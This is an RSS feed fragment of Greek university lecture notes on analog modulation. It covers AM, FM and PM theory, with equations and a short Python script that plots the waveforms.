<pubDate>Wed, 12 Oct 2022 00:00:00 +0300</pubDate>
<guid>posts/lectures/auth/tlp1/lec_TLP1_20221012.html</guid>
<description>
<![CDATA[<p>
Αναλογικά σήματα:
</p>
<ul class="org-ul">
<li>Διαμόρφωση πλάτους:
<ul class="org-ul">
<li>Αντικείμενο των διαλέξεων (2),3,4</li>
</ul></li>
<li>Διαμόρφωση γωνίας
<ul class="org-ul">
<li>Μετά φαντάζομαι</li>
</ul></li>
</ul>

<p>
Το γενικό concept για την μεταφορά σήματος στις αναλογικές επικοινωνίες:
<img src="posts/lectures/auth/tlp1/course_tlp1_images/course_tlp1_basics_signal-in-am.png" alt="course_tlp1_basics_signal-in-am.png">
</p>
<div id="outline-container-org4d9f6e0" class="outline-2">
<h2 id="org4d9f6e0"><span class="section-number-2">1.</span> <a href="#org4d9f6e0">Βασικές έννοιες.</a></h2>
<div class="outline-text-2" id="text-1">
</div>
<div id="outline-container-orgdc189eb" class="outline-3">
<h3 id="orgdc189eb"><span class="section-number-3">1.1.</span> <a href="#orgdc189eb">Φίλτρα</a></h3>
<div class="outline-text-3" id="text-1-1">
</div>
<div id="outline-container-org868cd55" class="outline-4">
<h4 id="org868cd55"><span class="section-number-4">1.1.1.</span> <a href="#org868cd55">LPF - Χαμηλοπερατό Φίλτρο</a></h4>
<div class="outline-text-4" id="text-1-1-1">
<p>
Ονομάζουμε το φίλτρο το οποίο επιτρέπει συχνότητες μόνο μικρότερες ορισμένης
συχνότητας \(f_1\)
<img src="posts/lectures/auth/tlp1/course_tlp1_images/course_tlp1_basic-filters_lpf.png" alt="course_tlp1_basic-filters_lpf.png">
</p>
</div>
</div>
<div id="outline-container-org052c350" class="outline-4">
<h4 id="org052c350"><span class="section-number-4">1.1.2.</span> <a href="#org052c350">HPF - Υψηλοπερατό Φίλτρο</a></h4>
<div class="outline-text-4" id="text-1-1-2">
<p>
Ονομάζουμε το φίλτρο το οποίο επιτρέπει συχνότητες μόνο μεγαλύτερες ορισμένης
συχνότητας \(f_1\)
<img src="posts/lectures/auth/tlp1/course_tlp1_images/course_tlp1_basic-filters_hpf.png" alt="course_tlp1_basic-filters_hpf.png">
</p>
</div>
</div>
<div id="outline-container-org05e1afa" class="outline-4">
<h4 id="org05e1afa"><span class="section-number-4">1.1.3.</span> <a href="#org05e1afa">BPF - Band Pass Filter, Ζωνοπερατό Φίλτρο</a></h4>
<div class="outline-text-4" id="text-1-1-3">
<p>
Ονομάζουμε το φίλτρο το οποίο επιτρέπει συχνότητες μόνο εντός μιας ζώνης
συχνοτήτων, δηλαδή συχνότητες οι οποίες βρίσκονται μεταξύ των
ορισμένων \(f_1\) και \(f_2\)
<img src="posts/lectures/auth/tlp1/course_tlp1_images/course_tlp1_basic-filters_bpf.png" alt="course_tlp1_basic-filters_bpf.png">
</p>
</div>
</div>
<div id="outline-container-orgfbb74d3" class="outline-4">
<h4 id="orgfbb74d3"><span class="section-number-4">1.1.4.</span> <a href="#orgfbb74d3">BSF - Band Stop Filter</a></h4>
<div class="outline-text-4" id="text-1-1-4">
<p>
Ονομάζουμε το φίλτρο το οποίο <i>κόβει</i> συχνότητες μόνο εντός μιας ζώνης συχνοτήτων,
δηλαδή συχνότητες οι οποίες βρίσκονται μεταξύ των ορισμένων \(f_1\) και \(f_2\)
<img src="posts/lectures/auth/tlp1/course_tlp1_images/course_tlp1_basic-filters_bsf.png" alt="course_tlp1_basic-filters_bsf.png">
</p>
</div>
</div>
</div>
<div id="outline-container-org714bc78" class="outline-3">
<h3 id="org714bc78"><span class="section-number-3">1.2.</span> <a href="#org714bc78">Ζωνοπερατά σήματα</a></h3>
<div class="outline-text-3" id="text-1-2">
<p>
Δοθείσης συχνότητας \(f_c\) μπορούμε να αναλύσουμε ένα σήμα (εκείνης της
συχνότητας) σε inphase και quadrature συνιστώσα:
</p>
\begin{equation}
\label{eq:5}
x(t) = x_i(t)\cos{2\pi f_c t} - x_q(t)\sin{2\pi f_c t}
\end{equation}
</div>
<div id="outline-container-org6a2d211" class="outline-4">
<h4 id="org6a2d211"><span class="section-number-4">1.2.1.</span> <a href="#org6a2d211">Παρατηρήσεις επι αυτού</a></h4>
<div class="outline-text-4" id="text-1-2-1">
<ul class="org-ul">
<li>Inphase όταν είναι το ήδη γνωστό σήμα πολλαπλασιζόμενο
από συνημίτονο στην κατάλληλη συχνότητα</li>
<li>Κάθετο αντίστοιχα όταν έχει ημίτονο ( λογικό, διαφορά \(\frac{\pi}{2}\) )</li>
<li><b>Τα δύο σήματα είναι μεταξύ τους ορθογώνια</b></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-orgd251073" class="outline-3">
<h3 id="orgd251073"><span class="section-number-3">1.3.</span> <a href="#orgd251073">Περιβάλλουσα</a></h3>
<div class="outline-text-3" id="text-1-3">
<p>
Με αυτόν τον τρόπο (ανάλυση σε συμφασική και κάθετη συνιστώσα) είναι εύκολος ο
προσδιορισμός της περιβάλλουσας (δηλαδή της καμπύλης που πρακτικά περικλείει την
γραφική παράσταση του αποστελλόμενου σήματος \(x(t)\)):
</p>
\begin{equation}
\label{eq:7}
V(t) = \sqrt{x_I^2(t) + x_Q^2(t)}
\end{equation}
</div>
</div>
<div id="outline-container-orgdf677bc" class="outline-3">
<h3 id="orgdf677bc"><span class="section-number-3">1.4.</span> <a href="#orgdf677bc">Διαμόρφωση</a></h3>
<div class="outline-text-3" id="text-1-4">
<p>
Μετασχηματισμός του σήματος πληροφορίας ούτως ώστε να μπορεί να μεταδοθεί και να
απομονωθεί με την χρήση ζωνοπερατού φίλτρου.
</p>

<p>
Μεταβάλλουμε κατάλληλα το σήμα πληροφοριών έτσι
ώστε να μπορούμε να το μεταδώσουμε επι <i>κοινόχρηστου</i> μέσου:
</p>

<p>
Τι κερδίζεται με την διαμόρφωση:
</p>
<ul class="org-ul">
<li>Πομποί και δέκτες χαμηλής πολυπλοκότητας</li>
<li>Πολυπλεξία ( δυνατότητα πολλών εκπομπών, ταυτόχρονων, επί του ίδιου μέσου )</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org5c65026" class="outline-2">
<h2 id="org5c65026"><span class="section-number-2">2.</span> <a href="#org5c65026">ΑΜ: Amplitude Modulation</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Διαμόρφωση πλάτους στον χρόνο.
Είδη διαμόρφωσης πλάτους (κατηγορίες):
</p>
<ol class="org-ol">
<li>DSB-AM-TC: Double Side Band-Amplitude Modulation-Total Carrier
<i>(Εξετάζεται σε αυτές τις σημειώσεις και συνεχίζει)</i></li>
<li>DSB-AM-SC: Double Side Band-Amplitude Modulation-Suppressed Carrier
<i>(Επόμενες διαλέξεις, όπως και όσα ακολουθούν)</i>. Αντί να προστίθεται το φέρον
ουσιαστικά έρχεται με την μορφή ενίσχυσης ούτως ώστε να μπορεί να μεταβληθεί
η ισχύς του σήματος.</li>
<li>SSB-AM: Single Sideband AM
Μετάδοση μόνο μιας εκ των δύο πλευρικών ζωνών: <a href="#org7708ff7">Φασματικό Περιεχόμενο</a>.</li>
<li>VSB-AM: Vestigial Side Band AM
Χρησιμοποιούνταν παλιότερα ακόμα και στις τηλεοράσεις, ουσιαστικά βελτίωση
του SSB-AM ως προς τον απαιτούμενο εξοπλισμό.</li>
</ol>

<p>
Αναλυτικότερα αν \(m(t)\) το σήμα πληροφορίας και \(x(t)\) το σήμα όπως εκπέμπεται: 
</p>

\begin{align}
m(t) &= 0.8\sin{\frac{\pi}{4}t}\\
x(t) &= [A_C+m(t)]\cos{2\pi f_c t}
\end{align}
</div>
<div id="outline-container-org452fd89" class="outline-3">
<h3 id="org452fd89"><span class="section-number-3">2.1.</span> <a href="#org452fd89">Δείκτης Διαμόρφωσης</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Ορίζουμε μέγεθος \(\mu\), τέτοιο ώστε:
</p>
\begin{equation}
\label{eq:6}
\mu = \frac{|\min m(t)|}{A_c}
\end{equation}
<p>
Το οποίο και ονομάζουμε δείκτη διαμόρφωσης.
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> Τι μας δείχνει</li>
<li class="off"><code>[&#xa0;]</code> Γιατί αν \(\mu>1\) έχουμε υπερδιαμόρφωση? Σε αυτή την περίπτωση η DC
συνιστώσα στο DSB-AM-TC ( αυτό αλλάζει στις άλλες κατηγορίες AM ), θα είναι
μικρότερη του&#x2026;
<ul class="org-ul">
<li>Σε αυτή την περίπτωση, παρατηρείται σημαντική διαφορά μεταξύ της τελικής και
της αρχικής κυματομορφής, ΠΡΕΠΕΙ ΝΑ ΕΞΗΓΗΘΕΙ ΚΑΛΥΤΕΡΑ.</li>
</ul></li>
<li>Αποφεύγοντας την υπερδιαμόρφωση:
<ul class="org-ul">
<li>VOGAD</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-org7708ff7" class="outline-3">
<h3 id="org7708ff7"><span class="section-number-3">2.2.</span> <a href="#org7708ff7">Φασματικό Περιεχόμενο</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
Όπως ήδη είδαμε σε EM1: ο μετασχηματισμός Fourier βοηθά στην μετάβαση από το
πεδίο του χρόνου, στο πεδίο της συχνότητας. Επομένως, με Fourier στο
αποστελλόμενο (?) σήμα:
</p>
\begin{equation}
\label{eq:1}
X(f) = \mathcal{F}[x(t)] = \cdots = \frac{1}{2}[M(f-f_c)+M(f+f_c)] + \frac{1}{2}A_C [\delta(f-f_c) + \delta(f+f_c)]
\end{equation}

<p>
Από τον πρώτο ώρο φαίνεται ότι πλέον <i>εμφανίζουμε</i> το σήμα πληροφοριών σε δύο
διαφορετικές ζώνες συχνοτήτων:
</p>
<ul class="org-ul">
<li>Άνω πλευρική ζώνη, όταν \(|f|>f_c\), δηλαδή ουσιαστικά εξωτερικά των αξόνων
\(x=-f_c, x=f_c\)</li>
<li>Κάτω πλευρική ζώνη, όταν \(|f| < f_c\), εσωτερικά των ανωτέρω αξόνων.</li>

<li>Απεικονίζει την \(M(f)\) ως αποτελούμενη από δύο ζώνες, μήκους W η κάθε μία,
συμμετρικές. Είναι όλα αυτά προαπαιτούμενα?
<ul class="org-ul">
<li>Οπότε λέμε γενικότερο εύρος ζώνης 2W</li>
<li><p>
Οι διαμορφώσεις, μετατοπισμένες τόσο στο \(-f_c\) όσο και στο \(+f_c\) έχουν
ίδιο εύρος ζώνης και μισό πλάτος.
</p>


<div id="orge40bc67" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec2_plevrikeszones.png" alt="tlp1_lec2_plevrikeszones.png">
</p>
</div></li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-org5b9169b" class="outline-3">
<h3 id="org5b9169b"><span class="section-number-3">2.3.</span> <a href="#org5b9169b">Ισχύς</a></h3>
<div class="outline-text-3" id="text-2-3">
<p>
Ουσιαστικά το αποστελλόμενο σήμα είναι της μορφής:
</p>
\begin{equation*}
x(t) = [A_c+m(t)]\cos{(\cdots)} = V(t)\cos{(\cdots)}
\end{equation*}
<p>
Η ισχύς της ΑΜ διαμόρφωσής μας δίνεται, λοιπόν, από την:
</p>
\begin{equation}
\label{eq:3}
P_{AM} = \frac{1}{2}A_c^2 + \frac{1}{2} P_{m(t)}
\end{equation}


<p>
Ορίζουμε κατόπιν και τον <b>συντελεστή απόδοσης ισχύος</b>:
</p>

\begin{equation}
\label{eq:4}
\eta = \frac{\frac{1}{2}P_m}{P_c + \frac{1}{2}P_m} = \frac{P_m}{A_c^2 + P_m}
\end{equation}
</div>
</div>
<div id="outline-container-org680292b" class="outline-3">
<h3 id="org680292b"><span class="section-number-3">2.4.</span> <a href="#org680292b">Επιπλέον: Φέρον και DC Συνιστώσα.</a></h3>
<div class="outline-text-3" id="text-2-4">
<p>
Το φέρον είναι το σήμα το οποίο προσθέτουμε κατά την διαμόρφωση έτσι ώστε να
βοηθήσουμε στην αποδιαμόρφωση του σήματος. Στην περίπτωση της <i>κλασικής</i> AM
διαμόρφωσης το φέρον έχει την μορφή DC συνιστώσας, όποτε και μπορούμε να πούμε
ότι τα δύο ταυτίζονται. Βέβαια αυτό δεν ισχύει σε όλες τις AM διαμορφώσεις.
</p>
</div>
</div>
</div>
]]>
</description></item>
<item>
<title>Διάλεξη 5: FM,PM Εισαγωγή στην διαμόρφωση FM</title>
<link>posts/lectures/auth/tlp1/lec_TLP1_20221017.html</link>
<pubDate>Mon, 17 Oct 2022 00:00:00 +0300</pubDate>
<guid>posts/lectures/auth/tlp1/lec_TLP1_20221017.html</guid>
<description>
<![CDATA[<div id="outline-container-org878eb5a" class="outline-2">
<h2 id="org878eb5a"><span class="section-number-2">1.</span> <a href="#org878eb5a">Διαμόρφωση γωνίας: Angle Modulation</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Όπως στην διαμόρφωση πλάτους έχουμε διάφορες υποκατηγορίες, έτσι και στην
διαμόρφωση γωνίας. 
</p>
<ul class="org-ul">
<li><b>FM</b>: (Frequency) Διαμόρφωση συχνότητας</li>
<li><b>PM</b>: (Phase) Διαμόρφωση Φάσης</li>
</ul>

<p>
Αν και οι <i>τύποι</i> τους παρουσιάζουν αρκετές διαφορές, τονίστηκε πως αποτελούν τις
δύο όψεις του ίδιου νομίσματος, καθώς σε αντίθεση με την διαμόρφωση πλάτους <i>(η
οποία μπορεί να θεωρηθεί γραμμική)</i> εδώ έχουμε την πληροφορία να εντάσσεται μέσα
στο πεδίο της γωνίας και συχνότητας.
</p>

<p>
Αυτό προκαλεί:
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> Διαστολή του εύρους ζώνης (δες τελευταία παράγραφο)</li>
<li>Μεγαλύτερη αντοχή στον θόρυβο.<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup></li>
</ul>

<div class="note" id="org1bc4507">
<p>
Κάτι το οποίο έπρεπε θεωρητικά να έχω παρατηρήσει από την AM διαμόρφωση:
</p>
<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<tbody>
<tr>
<td class="org-left">\(A_c\)</td>
<td class="org-left">Carrier&rsquo;s Amplitude</td>
<td class="org-left">Πλάτος φέροντος</td>
</tr>

<tr>
<td class="org-left">\(f_c\)</td>
<td class="org-left">Carrier&rsquo;s Frequency</td>
<td class="org-left">Συχνότητα φέροντος</td>
</tr>
</tbody>
</table>

</div>

<p>
Ο γενικός τύπος της διαμόρφωσης γωνίας είναι ο εξής:
</p>
\begin{equation}
\label{eq:1}
x(t) = A_C\cos{\left(\theta t\right)}
\end{equation}
<p>
με την πληροφορία να <i>εισάγεται</i> στο \(\theta\):
</p>
\begin{equation}
\label{eq:2}
\theta(t) = 2\pi f_ct + \phi(t)
\end{equation}
</div>
<div id="outline-container-org7346703" class="outline-3">
<h3 id="org7346703"><span class="section-number-3">1.1.</span> <a href="#org7346703">Στιγμιαία συχνότητα</a></h3>
<div class="outline-text-3" id="text-1-1">
<div class="note" id="org12697a8">
<p>
Αν και σαν μέγεθος είναι δύσκολο να παρατηρηθεί <i>φυσικά</i>, είναι εύκολο να
κατανοηθεί μέσα από την σχέση μεταξύ φάσης, γωνιακής συχνότητας/ταχύτητας, και
συχνότητας:
</p>

<p>
Είναι:
</p>

\begin{align*}
\label{eq:18}
f = &\frac{\omega}{2\pi}\\
\stackrel{\omega = \frac{d{\theta}}{d{t}}}{=} &\frac{1}{2\pi} \frac{d{\theta}}{d{t}} \\
\stackrel{\theta=2\pi f_ct + \phi(t)}{=} &fc+ \frac{1}{2\pi}\frac{d{\phi}}{d{t}}
\end{align*}

</div>

<p>
Πριν προχωρήσουμε, ορίζουμε νέο μέγεθος: την <b>στιγμιαία συχνότητα</b> (instant frequency)
</p>
\begin{equation}
\label{eq:3}
f_i(t) = 
\frac{1}{2\pi}
\frac{d\theta}{dt} = f_c + 
\frac{1}{2\pi}
\frac{d\phi}{dt}
\end{equation}

<p>
η οποία αποκτά ιδιαίτερη σημασία κατα την σύγκριση FM, PM
</p>
</div>
</div>
</div>
<div id="outline-container-orgb297d51" class="outline-2">
<h2 id="orgb297d51"><span class="section-number-2">2.</span> <a href="#orgb297d51">PM: Phase Modulation</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Εδώ η <b>φάση έχει γραμμική σχέση με το μήνυμα</b>, με συντελεστή \(K_p\), ο οποίος
λέγεται και ευαισθησίας φάσης.
</p>
\begin{equation}
\label{eq:6}
\phi(t) = K_pm(t)
\end{equation}

<p>
οπότε το πλήρως διαμορφωμένο σήμα είναι της μορφής:
</p>
\begin{equation}
\label{eq:8}
x(t) = A_c\cos{\left(2\pi f_ct + K_pm(t)\right)}
\end{equation}
</div>
<div id="outline-container-org56bcef0" class="outline-3">
<h3 id="org56bcef0"><span class="section-number-3">2.1.</span> <a href="#org56bcef0">Δείκτης διαμόρφωσης φάσης</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Ο δείκτης διαμόρφωσης \(\beta_p\) για την PM ορίζεται ως εξής:
</p>
\begin{equation}
\label{eq:15}
\beta_p = \max \Delta \phi = K_p \max |m(t)|
\end{equation}

<div class="note" id="org29cbd4f">
<p>
Ο δείκτης διαμόρφωσης της PM είναι ενδεικτικός της μέγιστης απόκλισης φάσης:
είναι ουσιαστικά η μέγιστη διαφορά που μπορεί να αποκτήσει το \(\theta\) από την
\(2\pi f_ct\)
</p>

</div>
</div>
</div>
</div>
<div id="outline-container-org4e1f255" class="outline-2">
<h2 id="org4e1f255"><span class="section-number-2">3.</span> <a href="#org4e1f255">FM: Frequency Modulation</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Η <b>\(f_i\) έχει γραμμική σχέση με το μήνυμα</b>, με συντελεστή \(K_f\), ονομαζόμενο και
ευαισθησία συχνότητας.
</p>

<p>
Στην διαμόρφωση συχνότητας:
</p>
\begin{equation}
\label{eq:4}
\frac{d{\phi}}{d{t}} = 2\pi K_fm(t)
\end{equation}

<p>
στην οποία λύνοντας ως προς \(\phi\):
</p>
\begin{align}
\label{eq:5}
\phi(t) &= 2\pi K_f\int_{-\infty}^t m(\tau)d\tau\\
f_i(t) &= f_c + K_f m(t)
\end{align}

<p>
Η δεύτερη σχέση μας δείχνει ότι περιμένουμε οι όποιες μεταβολές στην συχνότητα
περιμένουμε να είναι γύρω από την \(f_{c}\)
</p>
</div>
<div id="outline-container-org2e3053f" class="outline-3">
<h3 id="org2e3053f"><span class="section-number-3">3.1.</span> <a href="#org2e3053f">Δείκτης διαμόρφωσης συχνότητας</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
Ο δείκτης διαμόρφωσης \(\beta_f\) για την FM ορίζεται, σε πλήρη αναλογία με την PM:
</p>

\begin{equation}
\label{eq:615}
\beta_f = \frac{\max\Delta f}{W}= \frac{K_f \max |m(t)|}{W}
\end{equation}

<p>
με την μόνη διαφορά να είναι πως έχουμε μία κανονικοποίηση ως προς το εύρος
ζώνης.
</p>

<div class="note" id="org8831031">
<p>
Συνεχίζοντας την αναλογία με το \(\beta_p\) εδώ έχουμε πως το \(\beta_f\)
(πολλαπλασιασμένο επί \(W\) λόγω της κανονικόποίησης) μας δείχνει την μεγαλύτερη
απόκλιση που μπορεί να εμφανίσει η στιγμιαία συχνότητα από την συχνότητα
φέροντος (\(f_c\))
</p>

</div>
</div>
</div>
</div>
<div id="outline-container-org47bb8f2" class="outline-2">
<h2 id="org47bb8f2"><span class="section-number-2">4.</span> <a href="#org47bb8f2">Ανάλυση με παράλληλες και κάθετες συνιστώσες.</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Μπορούμε να κάνουμε ανάλυση του εκάστοτε σήματος σε <b>inphase</b> και <b>quadrature</b>
συνιστώσα, όπως άλλωστε κάναμε και στο AM. Εδώ όμως, αυτή η ανάλυση είναι πολύ
απλή:
</p>

\begin{align}
\label{eq:17}
x(t) = & A_c \cos{\left(2\pi f_ct + \phi(t)\right)} \stackrel{\cos{(a+b)} = \cos{a}\cos{b}-\sin{a}\sin{b}}{\Rightarrow} \\
=& A_c\cos{\phi(t)}\cos{2\pi f_ct} - A_c\sin{\phi(t)}\sin{2\pi f_ct}\\
=& x_i(t)\cos{2\pi f_ct} - x_Q(t)\sin{2\pi f_ct}
\end{align}

<p>
Οπότε έχουμε ακόμα: <b>περιβάλλουσα</b> και <b>φάση</b>
</p>
\begin{align}
\label{eq:10}
V(t) &= \sqrt{x_I^2 + x_Q^2} = A_{c}\\
\theta(t) &= \arctan{\frac{x_Q}{x_I}}
\end{align}
</div>
<div id="outline-container-org1fa7796" class="outline-3">
<h3 id="org1fa7796"><span class="section-number-3">4.1.</span> <a href="#org1fa7796">Baseband Αναπαράσταση:</a></h3>
<div class="outline-text-3" id="text-4-1">
<p>
Αναπαράσταση της παραπάνω σχέσης με την χρήση μιγαδικών:
</p>
\begin{equation}
\label{eq:9}
x(t) = x_i(t) + \jmath x_Q(t)
\end{equation}

<p>
Χρήσιμο κατα την αναπαράσταση σημάτων στο επίπεδο.
</p>

<p>
Με την σειρά της η αναπαράσταση σημάτων στο επίπεδο είναι χρήσιμη για την
διαχείριση των σημάτων, βάση κανόνων Ευκλίδειας γεωμετρίας.
</p>
</div>
</div>
</div>
<div id="outline-container-orgf9f383e" class="outline-2">
<h2 id="orgf9f383e"><span class="section-number-2">5.</span> <a href="#orgf9f383e">Visualizing PM and FM</a></h2>
<div class="outline-text-2" id="text-5">

<div id="org0fc4f50" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec5_pm-fm-time-comparison.png" alt="tlp1_lec5_pm-fm-time-comparison.png">
</p>
<p><span class="figure-number">Figure 1: </span>Το σήμα εισόδου(πληροφορίας) και τα αντίστοιχα σήματα εξόδου κατόπιν διαμόρφωσης PM,FM.</p>
</div>


<p>
Συνοψίζοντας τα παραπάνω, κατα την διαμόρφωση γωνίας μπορούμε να δούμε.
</p>
\begin{equation}
\label{eq:7}
\phi(t) =
\begin{cases}
K_pm(t)\\
2\pi K_f\int_{-\infty}^tm(\tau)d\tau
\end{cases}
\end{equation}
</div>
<div id="outline-container-org6fa67b3" class="outline-3">
<h3 id="org6fa67b3"><span class="section-number-3">5.1.</span> <a href="#org6fa67b3">Παρατήρηση για το γράφημα</a></h3>
<div class="outline-text-3" id="text-5-1">
<p>
Προσπαθώ γενικά να βγάζω τα διαγράμματα μου με python, αλλά λόγω της μη
εξοικείωσης μου με τις <code>numpy</code> και <code>scipy</code>, βρίσκω συχνά ατέλειες οι οποίες είναι
παραπάνω από απλά εμφανείς στο παραπάνω διάγραμμα.
</p>

<div class="org-src-container">
<pre class="src src-python"><span class="org-keyword">import</span> numpy <span class="org-keyword">as</span> np
<span class="org-keyword">import</span> matplotlib.pyplot <span class="org-keyword">as</span> plt
<span class="org-keyword">import</span> scipy

<span class="org-comment-delimiter"># </span><span class="org-comment">mf = message frequency</span>
<span class="org-variable-name">mf</span> <span class="org-operator">=</span> 5
<span class="org-variable-name">fc</span> <span class="org-operator">=</span> 5
<span class="org-variable-name">Ac</span> <span class="org-operator">=</span> 2

<span class="org-variable-name">Kf</span> <span class="org-operator">=</span> 2
<span class="org-variable-name">Kp</span> <span class="org-operator">=</span> 2<span class="org-operator">*</span>np.pi<span class="org-operator">*</span>Kf

<span class="org-variable-name">T</span> <span class="org-operator">=</span> np.linspace(0,2<span class="org-operator">/</span>mf,1000)

fig, (<span class="org-variable-name">ax1</span>, <span class="org-variable-name">ax2</span>, <span class="org-variable-name">ax3</span>) <span class="org-operator">=</span> plt.subplots(3,1)

<span class="org-keyword">def</span> <span class="org-function-name">m</span>(t):
    <span class="org-keyword">return</span> np.cos(2<span class="org-operator">*</span>np.pi<span class="org-operator">*</span>mf<span class="org-operator">*</span>t)

<span class="org-keyword">def</span> <span class="org-function-name">fm</span>(t):
    <span class="org-variable-name">res</span> <span class="org-operator">=</span> np.zeros_like(t)
    <span class="org-keyword">for</span> i,val <span class="org-keyword">in</span> <span class="org-builtin">enumerate</span>(t):
        <span class="org-variable-name">y</span>,<span class="org-variable-name">err</span> <span class="org-operator">=</span> scipy.integrate.quad(m,<span class="org-operator">-</span>np.inf,val)
        <span class="org-variable-name">res</span>[i]<span class="org-operator">=</span> Ac<span class="org-operator">*</span>np.cos(2<span class="org-operator">*</span>np.pi<span class="org-operator">*</span>fc<span class="org-operator">*</span>val <span class="org-operator">+</span> 2<span class="org-operator">*</span>3<span class="org-operator">*</span>Kf<span class="org-operator">*</span>y) 
    <span class="org-keyword">return</span> res

<span class="org-variable-name">pm</span> <span class="org-operator">=</span> Ac<span class="org-operator">*</span>np.cos(2<span class="org-operator">*</span>np.pi<span class="org-operator">*</span>fc<span class="org-operator">*</span>T <span class="org-operator">+</span> Kp<span class="org-operator">*</span>m(T)) 

ax1.plot(T,m(T))
ax1.set_title(<span class="org-string">"message"</span>)

ax2.plot(T,pm)
ax2.set_title(<span class="org-string">"PM"</span>)

ax3.plot(T,fm(T))
ax3.set_title(<span class="org-string">"fm"</span>)

fig.show()

</pre>
</div>

<p>
Αν έχει κανείς συμβουλή για το πως να μην καταστρέφω έτσι τα integrals θα
χαιρόμουν να το ακούσω &#x2026; 
</p>

<ul class="org-ul">
<li>Ενημέρωση στις: <span class="timestamp-wrapper"><span class="timestamp">&lt;2023-01-25 Wed&gt;</span></span>. Μέσα στις γιορτές έτυχε να το δουλέψω λίγο
το παραπάνω (παρόλο που ο κώδικας δεν έχει ενημερωθεί), και βλέποντας αρκετές
πηγές οι οποίες είχαν (και εκείνες) πρόβλημα με το γράφημα της FM διαμόρφωσης
ντρέπομαι λίγο λιγότερο :P. Παρόλα αυτά, μέχρι να διορθώσω λίγο τον κώδικα,
μια κάπως πιο ομαλή γραφική παράσταση μπορεί να εμφανιστεί αν αντί του
υπολογισμού του ολοκληρώματος από \(-\infty\), εώς την εκάστοε χρονική στιγμή
χρησιμοποιήσει κάποιος την ιδιότητα των ολοκληρωμάτων ώστε κάθε σημείο του
γραφήματος να είναι άθροισμα των προηγούμενων&#x2026;</li>
</ul>
</div>
</div>
<div id="outline-container-org949fb5a" class="outline-3">
<h3 id="org949fb5a"><span class="section-number-3">5.2.</span> <a href="#org949fb5a">Σύγκριση Γραφικών παραστάσεων AM, FM, PM</a></h3>
<div class="outline-text-3" id="text-5-2">
<p>
Σε αντίθεση με AM οπου βλέπεις διακυμάνσεις πλάτους σε ένα γενικότερο σήμα
<i>σταθερής συχνότητας στην διαμόρφωση γωνίας η /τελική</i> γραφική παράσταση
παρουσιάζει αραιώσεις:
</p>
<ul class="org-ul">
<li>Στην FM διαμόρφωση γενικά είναι πιο εύκολο να καταλάβεις τις αραιώσεις και
τις συμπτύξεις (αν και όχι όπως το εμφάνισα εγώ)</li>
<li>Στην PM είναι ακόμα πιο δύσκολο να διακρίνεις την διαφορά.</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org6f22eb1" class="outline-2">
<h2 id="org6f22eb1"><span class="section-number-2">6.</span> <a href="#org6f22eb1">Ισχύς</a></h2>
<div class="outline-text-2" id="text-6">
<p>
Η ισχύς του σήματος μας είναι σταθερή, όπως άλλωστε ήταν αναμενόμενο από τον
γενικό τύπο: \(x(t) = A_c\cos{\theta}\):
</p>
\begin{equation}
\label{eq:12}
P_{PM} = P_{FM} = \frac{A_c^2}{2}
\end{equation}
</div>
</div>
<div id="outline-container-org3924c82" class="outline-2">
<h2 id="org3924c82"><span class="section-number-2">7.</span> <a href="#org3924c82">Ιδιότητα της δυικότητας</a></h2>
<div class="outline-text-2" id="text-7">
<p>
Οι διαμορφώσεις PM, FM εμφανίζουν την ιδιότητα της δυικότητας, την οποία στην
συγκεκριμένη περίπτωση αποδίδουμε στο γεγονός ότι μπορούμε να μεταδώσουμε την
ίδια πληροφορία (διαμορφωμένη με τον ίδιο τρόπο) με διαφορετικό μηχανισμό απο
πίσω.
</p>

<p>
Ισοδύναμα η δυικότητα είναι εμφανής από το εξής: <b>ΔΕΝ ΧΡΕΙΑΖΕΤΑΙ PM/FM
ΔΙΑΜΟΡΦΩΤΗΣ ΓΙΑ ΤΗΝ ΕΠΙΤΕΥΞΗ ΤΗΣ ΑΝΤΙΣΤΟΙΧΗΣ ΔΙΑΜΟΡΦΩΣΗΣ</b>.
</p>

<div class="note" id="orgf8d336a">
<p>
Οι <i>ισότητες</i> παραπάνω ισχύουν υπό την προϋπόθεση πως<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>:
</p>
\begin{equation}
\label{eq:13}
K_p = 2\pi K_f
\end{equation}

</div>


<div id="orgcdd0a0c" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec5_duality-analytical.png" alt="tlp1_lec5_duality-analytical.png">
</p>
<p><span class="figure-number">Figure 2: </span>Υποδεικνύοντας την δυικότητα μεταξύ PM, FM</p>
</div>
</div>
</div>
<div id="outline-container-orgef6fbda" class="outline-2">
<h2 id="orgef6fbda"><span class="section-number-2">8.</span> <a href="#orgef6fbda">Ψηφιακό και Διαμορφώσεις: FM</a></h2>
<div class="outline-text-2" id="text-8">
<ul class="org-ul">
<li><b>AM</b>: Κλασσικό έχει ήδη αναλυθεί</li>
<li><b>FM</b>: Χρήση ταδε αριθμού διαφορετικών συχνοτήτων</li>
<li><b>PM</b>: Χρήση τάδε αριθμού διαφορετικών φάσεων - η διαφορά φάσης είναι ανιχνεύσιμη
στον δέκτη.

<ul class="org-ul">
<li>Δεν είναι τόσο σημαντικό στο πλαίσιο του μαθήματος αλλά συνδέει TLP1 - TLP2</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-org4104819" class="outline-2">
